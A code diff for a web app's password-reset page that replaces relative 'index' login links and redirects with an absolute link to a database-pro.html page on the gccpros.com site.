@@ -63,7 +63,7 @@
   <div id="invalid-state" style="display:none;">
     <h2>Link expired</h2>
     <p class="sub">This password reset link has expired or already been used. Reset links are valid for 1 hour.</p>
-    <a href="index" class="btn" style="display:block;text-align:center;text-decoration:none;padding:14px;">Back to login</a>
+    <a href="https://www.gccpros.com/database-pro.html" class="btn" style="display:block;text-align:center;text-decoration:none;padding:14px;">Back to login</a>
     <p style="text-align:center;margin-top:12px;font-size:12px;color:#546E7A;">
       Need a new link? Use <strong>Forgot password?</strong> on the login page.
     </p>
@@ -87,14 +87,14 @@
       <br>
       <button class="btn" id="save-btn" onclick="savePassword()">Set new password</button>
     </div>
-    <a href="index" class="back">← Back to login</a>
+    <a href="https://www.gccpros.com/database-pro.html" class="back">← Back to login</a>
   </div>
 
   <!-- Success state -->
   <div id="success-state" style="display:none;">
     <h2 style="color:#2E7D32;">Password updated ✅</h2>
     <p class="sub">Your password has been changed successfully. You can now log in.</p>
-    <a href="index" class="btn" style="display:block;text-align:center;text-decoration:none;padding:14px;margin-top:8px;">Go to login</a>
+    <a href="https://www.gccpros.com/database-pro.html" class="btn" style="display:block;text-align:center;text-decoration:none;padding:14px;margin-top:8px;">Go to login</a>
   </div>
 </div>
 
@@ -155,10 +155,10 @@ window.addEventListener('load', function() {
     setTimeout(function(){ window.location.href = continueUrl + sep + fwd; }, 250);
   } else if (mode === 'verifyEmail') {
     // Handle email verification if needed
-    window.location.href = 'index';
+    window.location.href = 'https://www.gccpros.com/database-pro.html';
   } else {
     // No valid mode — redirect to login
-    window.location.href = 'index';
+    window.location.href = 'https://www.gccpros.com/database-pro.html';
   }
 });
 
@@ -220,7 +220,7 @@ async function savePassword() {
     document.getElementById('reset-form').style.display = 'none';
     document.getElementById('success-state').style.display = 'block';
     // Auto-redirect to login after 3 seconds
-    setTimeout(() => window.location.href = 'index', 3000);
+    setTimeout(() => window.location.href = 'https://www.gccpros.com/database-pro.html', 3000);
   } catch(e) {
     btn.disabled = false;
     btn.textContent = 'Set new password';
